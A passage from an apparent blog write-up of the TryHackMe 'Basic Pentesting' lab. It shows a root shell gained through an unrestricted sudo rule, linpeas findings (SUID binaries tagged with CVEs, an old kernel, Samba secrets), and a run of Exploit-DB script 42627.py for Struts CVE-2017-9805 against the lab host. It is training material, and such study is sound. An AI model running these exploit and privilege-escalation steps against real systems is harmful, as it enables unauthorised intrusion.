User kay may run the following commands on basic2<span style=color:#f92672>:</span>
    <span style=color:#f92672>(</span>ALL <span style=color:#f92672>:</span> ALL<span style=color:#f92672>)</span> ALL
</code></pre></div><p>Aaaand, we&rsquo;re <strong>root</strong>!</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%205.png alt=/images/thm-basic_pentesting/Untitled%205.png></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>root<span style=color:#a6e22e>@basic2</span>:<span style=color:#f92672>~</span><span style=color:#75715e># cat flag.txt</span>
Congratulations<span style=color:#960050;background-color:#1e0010>!</span> You<span style=color:#e6db74>&#39;ve completed this challenge. There are two ways (that I&#39;</span>m aware of) to gain 
a shell, <span style=color:#f92672>and</span> two ways to privesc<span style=color:#f92672>.</span> I encourage you to find them all<span style=color:#960050;background-color:#1e0010>!</span>

If you<span style=color:#e6db74>&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few</span>
takeaways <span style=color:#f92672>from</span> this challenge should be that every little bit of information you can find can be
valuable, but sometimes you<span style=color:#e6db74>&#39;ll need to find several different pieces of information and combine</span>
them to make them useful<span style=color:#f92672>.</span> Enumeration <span style=color:#f92672>is</span> key<span style=color:#960050;background-color:#1e0010>!</span> Also, sometimes it<span style=color:#e6db74>&#39;s not as easy as just finding</span>
an obviously outdated, vulnerable service right away <span style=color:#66d9ef>with</span> a port scan (unlike the first entry
<span style=color:#f92672>in</span> this series)<span style=color:#f92672>.</span> Usually you<span style=color:#e6db74>&#39;ll have to dig deeper to find things that aren&#39;</span>t <span style=color:#66d9ef>as</span> obvious, <span style=color:#f92672>and</span>
therefore might<span style=color:#e6db74>&#39;ve been overlooked by administrators.</span>

Thanks <span style=color:#66d9ef>for</span> taking the time to solve this VM<span style=color:#f92672>.</span> If you choose to create a writeup, I hope you<span style=color:#e6db74>&#39;ll send </span>
me a link<span style=color:#960050;background-color:#1e0010>!</span> I can be reached at josiah<span style=color:#a6e22e>@vt.edu.</span> If you<span style=color:#e6db74>&#39;ve got questions or feedback, please reach</span>
out to me<span style=color:#f92672>.</span>

Happy hacking<span style=color:#960050;background-color:#1e0010>!</span>
</code></pre></div><p>That was easy and definitely a <strong>basic pentesting</strong> machine! Hopefully you enjoyed reading till the end (that is if you did üòÑ)</p><hr><h2 id=alternate-method-to-privesc>Alternate method to PrivEsc!<a hidden class=anchor aria-hidden=true href=#alternate-method-to-privesc>#</a></h2><p><strong>The flag mentions there&rsquo;s an alternate method to privesc too</strong>! Let&rsquo;s find that out.</p><p>Let&rsquo;s run <code>linpeas</code> and note all the actionable things!</p><ul><li>The <strong>kernel version</strong> <strong>looks really old</strong>.</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£</span> Basic information <span style=color:#960050;background-color:#1e0010>‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê</span>                                                                                                                      
OS: Linux version <span style=color:#ae81ff>4.4</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>119</span><span style=color:#f92672>-</span>generic (buildd<span style=color:#a6e22e>@lcy01</span><span style=color:#f92672>-</span>amd64<span style=color:#f92672>-</span><span style=color:#ae81ff>013</span>) (gcc version <span style=color:#ae81ff>5.4</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span> <span style=color:#ae81ff>20160609</span> (Ubuntu <span style=color:#ae81ff>5.4</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>ubuntu1<span style=color:#f92672>~</span><span style=color:#ae81ff>16.04</span><span style=color:#f92672>.</span><span style=color:#ae81ff>9</span>) ) <span style=color:#75715e>#143-Ubuntu SMP Mon Apr 2 16:08:24 UTC 2018</span>
</code></pre></div><ul><li>Services listening on <code>port 8005</code> locally (remember the server we saw in the initial <code>.txts</code> maybe?)</li><li>Also, <code>port 8080</code> and <code>8009</code> listening from everywhere! Nmap (<code>-sC</code> and <code>-sV</code>) missed this ‚Äî <strong>Always full port scan first!</strong> üòõ</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>[<span style=color:#f92672>+</span>] Active Ports
[i] https:<span style=color:#f92672>//</span>book<span style=color:#f92672>.</span>hacktricks<span style=color:#f92672>.</span>xyz<span style=color:#f92672>/</span>linux<span style=color:#f92672>-</span>unix<span style=color:#f92672>/</span>privilege<span style=color:#f92672>-</span>escalation<span style=color:#75715e>#open-ports</span>
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>:<span style=color:#ae81ff>22</span>              <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>:<span style=color:#f92672>*</span>               LISTEN      <span style=color:#f92672>-</span>               
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>:<span style=color:#ae81ff>445</span>             <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>:<span style=color:#f92672>*</span>               LISTEN      <span style=color:#f92672>-</span>               
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>:<span style=color:#ae81ff>139</span>             <span style=color:#ae81ff>0.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.0</span>:<span style=color:#f92672>*</span>               LISTEN      <span style=color:#f92672>-</span>               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>22</span>                   :::<span style=color:#f92672>*</span>                    LISTEN      <span style=color:#f92672>-</span>               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>445</span>                  :::<span style=color:#f92672>*</span>                    LISTEN      <span style=color:#f92672>-</span>               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>127.0</span><span style=color:#f92672>.</span><span style=color:#ae81ff>0.1</span>:<span style=color:#ae81ff>8005</span>          :::<span style=color:#f92672>*</span>                    LISTEN      <span style=color:#f92672>-</span>               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>8009</span>                 :::<span style=color:#f92672>*</span>                    LISTEN      <span style=color:#f92672>-</span>               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>139</span>                  :::<span style=color:#f92672>*</span>                    LISTEN      <span style=color:#f92672>-</span>               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>8080</span>                 :::<span style=color:#f92672>*</span>                    LISTEN      <span style=color:#f92672>-</span>               
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>80</span>                   :::<span style=color:#f92672>*</span>                    LISTEN      <span style=color:#f92672>-</span>
</code></pre></div><ul><li>Haven&rsquo;t seen this before, but maybe the <strong>SMB service&rsquo;s secrets file</strong> (only <em>readable/writeable</em> by <code>root</code>)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>[<span style=color:#f92672>+</span>] Searching AD cached hashes
<span style=color:#f92672>-</span>rw<span style=color:#f92672>-------</span> <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>430080</span> Apr <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>samba<span style=color:#f92672>/</span>private<span style=color:#f92672>/</span>secrets<span style=color:#f92672>.</span>tdb
</code></pre></div><ul><li>Highlighted <code>SUID</code> and <code>ntfs-3g</code> (I remember some exploits on them)</li></ul><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£</span> Interesting Files <span style=color:#960050;background-color:#1e0010>‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê</span>                                                                                                                      
[<span style=color:#f92672>+</span>] SUID <span style=color:#f92672>-</span> Check easy privesc, exploits <span style=color:#f92672>and</span> write perms                                                                                                                                                            
[i] https:<span style=color:#f92672>//</span>book<span style=color:#f92672>.</span>hacktricks<span style=color:#f92672>.</span>xyz<span style=color:#f92672>/</span>linux<span style=color:#f92672>-</span>unix<span style=color:#f92672>/</span>privilege<span style=color:#f92672>-</span>escalation<span style=color:#75715e>#sudo-and-suid                                                                                                                                      </span>
strings Not Found                                                                                        
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>44</span>K May  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2014</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>ping6                                                                                                                                                        
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>44</span>K May  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2014</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>ping                                                                                                                                                         
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>sr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> daemon daemon      <span style=color:#ae81ff>51</span>K Jan <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2016</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>at  <span style=color:#f92672>---&gt;</span>  RTru64_UNIX_4<span style=color:#f92672>.</span><span style=color:#ae81ff>0</span>g(CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2002</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1614</span>)                                                                                                                
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>15</span>K Jan <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2016</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>policykit<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>polkit<span style=color:#f92672>-</span>agent<span style=color:#f92672>-</span>helper<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>                                                                                                                        
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>23</span>K Jan <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2016</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>pkexec  <span style=color:#f92672>---&gt;</span>  Linux4<span style=color:#f92672>.</span><span style=color:#ae81ff>10</span>_to_5<span style=color:#f92672>.</span><span style=color:#ae81ff>1.17</span>(CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2019</span><span style=color:#f92672>-</span><span style=color:#ae81ff>13272</span>)<span style=color:#f92672>/</span>rhel_6(CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2011</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1485</span>)                                                                                  
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>31</span>K Jul <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2016</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>fusermount                                                                                                                                                   
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root       <span style=color:#ae81ff>2.4</span>M Nov <span style=color:#ae81ff>24</span>  <span style=color:#ae81ff>2016</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>vim<span style=color:#f92672>.</span>basic                                                                                                                                                
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>--</span> <span style=color:#ae81ff>1</span> root   messagebus  <span style=color:#ae81ff>42</span>K Jan <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>dbus<span style=color:#f92672>-</span><span style=color:#ae81ff>1.0</span><span style=color:#f92672>/</span>dbus<span style=color:#f92672>-</span>daemon<span style=color:#f92672>-</span>launch<span style=color:#f92672>-</span>helper                                                                                                                       
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root       <span style=color:#ae81ff>139</span>K Jan <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>ntfs<span style=color:#f92672>-</span><span style=color:#ae81ff>3</span>g  <span style=color:#f92672>---&gt;</span>  Debian9<span style=color:#f92672>/</span><span style=color:#ae81ff>8</span><span style=color:#f92672>/</span><span style=color:#ae81ff>7</span><span style=color:#f92672>/</span>Ubuntu<span style=color:#f92672>/</span>Gentoo<span style=color:#f92672>/</span>others<span style=color:#f92672>/</span>Ubuntu_Server_16<span style=color:#f92672>.</span><span style=color:#ae81ff>10</span>_and_others(<span style=color:#ae81ff>02</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2017</span>)                                                                      
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>10</span>K Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>eject<span style=color:#f92672>/</span>dmcrypt<span style=color:#f92672>-</span>get<span style=color:#f92672>-</span>device                                                                                                                                 
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>40</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>chsh                                                                                                                                                     
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>53</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>passwd  <span style=color:#f92672>---&gt;</span>  Apple_Mac_OSX(<span style=color:#ae81ff>03</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2006</span>)<span style=color:#f92672>/</span>Solaris_8<span style=color:#f92672>/</span><span style=color:#ae81ff>9</span>(<span style=color:#ae81ff>12</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2004</span>)<span style=color:#f92672>/</span>SPARC_8<span style=color:#f92672>/</span><span style=color:#ae81ff>9</span><span style=color:#f92672>/</span>Sun_Solaris_2<span style=color:#f92672>.</span><span style=color:#ae81ff>3</span>_to_2<span style=color:#f92672>.</span><span style=color:#ae81ff>5.1</span>(<span style=color:#ae81ff>02</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1997</span>)                                                    
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>74</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>gpasswd                                                                                                                                                  
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>49</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>chfn  <span style=color:#f92672>---&gt;</span>  SuSE_9<span style=color:#f92672>.</span><span style=color:#ae81ff>3</span><span style=color:#f92672>/</span><span style=color:#ae81ff>10</span>                        
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>39</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>newgrp  <span style=color:#f92672>---&gt;</span>  HP<span style=color:#f92672>-</span>UX_10<span style=color:#f92672>.</span><span style=color:#ae81ff>20</span>                                                                                                                                
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>40</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>su                                                                                                                                                           
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>33</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>newuidmap                                                                                                                                                
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>33</span>K May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>newgidmap                                                                                                                                                
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>39</span>K Jun <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>x86_64<span style=color:#f92672>-</span>linux<span style=color:#f92672>-</span>gnu<span style=color:#f92672>/</span>lxc<span style=color:#f92672>/</span>lxc<span style=color:#f92672>-</span>user<span style=color:#f92672>-</span>nic                                                                                                                        
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root       <span style=color:#ae81ff>134</span>K Jul  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sudo  <span style=color:#f92672>---&gt;</span>  <span style=color:#f92672>/</span>sudo<span style=color:#960050;background-color:#1e0010>$</span>                                                                                                                                       
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>sr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>84</span>K Nov <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>snapd<span style=color:#f92672>/</span>snap<span style=color:#f92672>-</span>confine                                                                                                                                       
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>27</span>K Nov <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>umount  <span style=color:#f92672>---&gt;</span>  BSD<span style=color:#f92672>/</span>Linux(<span style=color:#ae81ff>08</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1996</span>)                                                                                                                             
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root        <span style=color:#ae81ff>40</span>K Nov <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>2017</span> <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>mount  <span style=color:#f92672>---&gt;</span>  Apple_Mac_OSX(Lion)_Kernel_xnu<span style=color:#f92672>-</span><span style=color:#ae81ff>1699.32</span><span style=color:#f92672>.</span><span style=color:#ae81ff>7</span>_except_xnu<span style=color:#f92672>-</span><span style=color:#ae81ff>1699.24</span><span style=color:#f92672>.</span><span style=color:#ae81ff>8</span>                                                                                   
<span style=color:#f92672>-</span>rwsr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>1</span> root   root       <span style=color:#ae81ff>419</span>K Jan <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2018</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>openssh<span style=color:#f92672>/</span>ssh<span style=color:#f92672>-</span>keysign
</code></pre></div><hr><h3 id=port-8080---http>Port 8080 - HTTP<a hidden class=anchor aria-hidden=true href=#port-8080---http>#</a></h3><p>Alright, we found <strong>Apache Tomcat server</strong> running on the server. The credentials also need to be <code>bruteforced</code> to access. But again, let&rsquo;s refer to the file <code>dev.txt</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ae81ff>2018</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>23</span>: I<span style=color:#e6db74>&#39;ve been messing with that struts stuff, and it&#39;</span>s pretty cool<span style=color:#960050;background-color:#1e0010>!</span> I think it might be neat
to host that on this server too<span style=color:#f92672>.</span> Haven<span style=color:#e6db74>&#39;t made any real web apps yet, but I have tried that example</span>
you get to show off how it works (<span style=color:#f92672>and</span> it<span style=color:#e6db74>&#39;s the REST version of the example!). Oh, and right now I&#39;</span>m 
using version <span style=color:#ae81ff>2.5</span><span style=color:#f92672>.</span><span style=color:#ae81ff>12</span>, because other versions were giving me trouble<span style=color:#f92672>.</span> <span style=color:#f92672>-</span>K
</code></pre></div><p>So, two things, <code>first struts</code> (many exploits of <strong>apache struts</strong>) and other thing mentioned is <code>REST API</code>.</p><p>Let&rsquo;s search for exploits:</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%206.png alt=/images/thm-basic_pentesting/Untitled%206.png></p><p>Alright, this exploit seems like the one! <code>linux/remote/42627.py</code></p><p>Running the <code>exploit</code> and wasn&rsquo;t successful since we don&rsquo;t have the right path to the <strong>REST API</strong>. Tried <code>custom ones</code>, didn&rsquo;t work. Googled the exploitation of this vulnerability and found out this cool article ( <a href=https://blog.appsecco.com/detecting-and-exploiting-the-java-struts2-rest-plugin-vulnerability-cve-2017-9805-765773921d3d>Detecting and Exploiting the Java Struts2 REST Plugin vulnerability ‚Äî CVE-2017‚Äì9805</a> )</p><p>He deployed the custom version (<em>from dev.txt</em>), we also have the custom version! Let&rsquo;s try it!</p><p>The path becomes: <em>http://10.10.137.134:8080/struts2-rest-showcase-2.5.12</em></p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%207.png alt=/images/thm-basic_pentesting/Untitled%207.png></p><p>Worked fine and we got <code>redirected</code>, let&rsquo;s pass this to the <strong>exploit</strong>!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> python3 <span style=color:#ae81ff>42627.</span>py                                                            
CVE: <span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>9805</span> <span style=color:#f92672>-</span> Apache Struts2 Rest Plugin Xstream RCE
<span style=color:#f92672>[*]</span> Warflop <span style=color:#f92672>-</span> http<span style=color:#f92672>:</span><span style=color:#75715e>//securityattack.com.br
</span><span style=color:#75715e></span><span style=color:#f92672>[*]</span> Greatz<span style=color:#f92672>:</span> Pimps <span style=color:#f92672>&amp;</span> G4mbl3r
<span style=color:#f92672>[*]</span> Use<span style=color:#f92672>:</span> python struts2<span style=color:#f92672>.</span><span style=color:#a6e22e>py</span> URL COMMAND
<span style=color:#f92672>[*]</span> Example<span style=color:#f92672>:</span> python struts2<span style=color:#f92672>.</span><span style=color:#a6e22e>py</span> http<span style=color:#f92672>:</span><span style=color:#75715e>//sitevulnerable.com/struts2-rest-showcase/orders/3 id
</span></code></pre></div><p>The argument becomes:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d><span style=color:#960050;background-color:#1e0010>‚îå‚îÄ‚îÄ</span><span style=color:#f92672>(</span>root<span style=color:#960050;background-color:#1e0010>üíÄ</span>b0x<span style=color:#f92672>)-[~/</span>THM<span style=color:#f92672>/</span>Basic Pentesting<span style=color:#f92672>]</span>
<span style=color:#960050;background-color:#1e0010>‚îî‚îÄ#</span> python3 <span style=color:#ae81ff>42627.</span>py http<span style=color:#f92672>:</span><span style=color:#75715e>//10.10.137.134:8080/struts2-rest-showcase-2.5.12/orders/2 id           
</span><span style=color:#75715e></span><span style=color:#f92672>&lt;!</span>doctype html<span style=color:#f92672>&gt;&lt;</span>html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span><span style=color:#f92672>&gt;&lt;</span>head<span style=color:#f92672>&gt;&lt;</span>title<span style=color:#f92672>&gt;</span>HTTP Status <span style=color:#ae81ff>500</span> <span style=color:#960050;background-color:#1e0010>‚Äì</span> Internal Server Error<span style=color:#f92672>&lt;/</span>title<span style=color:#f92672>&gt;&lt;</span>style type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span><span style=color:#f92672>&gt;</span>h1 <span style=color:#f92672>{</span>font<span style=color:#f92672>-</span>family<span style=color:#f92672>:</span>Tahoma<span style=color:#f92672>,</span>Arial<span style=color:#f92672>,</span>sans<span style=color:#f92672>-</span>serif<span style=color:#f92672>;</span>color<span style=color:#f92672>:</span>white<span style=color:#f92672>;</span>background<span style=color:#f92672>-</span>color<span style=color:#f92672>:</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>525</span>D76<span style=color:#f92672>;</span>font<span style=color:#f92672>-</span>size<span style=color:#f92672>:</span><span style=color:#ae81ff>22</span>px<span style=color:#f92672>;}</span> h2 
